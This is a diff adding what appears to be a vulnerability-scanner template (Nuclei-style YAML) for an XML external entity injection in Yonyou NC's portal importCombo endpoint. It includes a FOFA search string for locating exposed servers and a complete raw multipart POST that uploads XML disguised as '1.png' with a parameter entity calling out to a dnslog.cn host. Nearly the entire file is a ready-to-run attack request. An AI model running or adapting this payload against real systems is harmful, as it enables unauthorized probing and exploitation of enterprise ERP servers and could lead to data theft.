@@ -1,0 +1,41 @@
+id: poc-gff1str7l6hpya81
+info:
+  name: 用友NC importCombo存在XML注入漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gff1str7l6hpya81'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gff1str7l6hpya81
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - 'POST /portal/pt/portalcombo/importCombo?pageId=login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3LEPfAt3B386AN3f
+
+
+    ------WebKitFormBoundary3LEPfAt3B386AN3f
+
+    Content-Disposition: form-data; name="file"; filename="1.png"
+
+
+    <?xml version="1.0" encoding="UTF-8"?>
+
+    <!DOCTYPE root [
+
+    <!ENTITY % remote SYSTEM "http://1233.c6pqn1.dnslog.cn/xxe_test">
+
+    %remote;]>
+
+    <root/>
+
+    ------WebKitFormBoundary3LEPfAt3B386AN3f--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
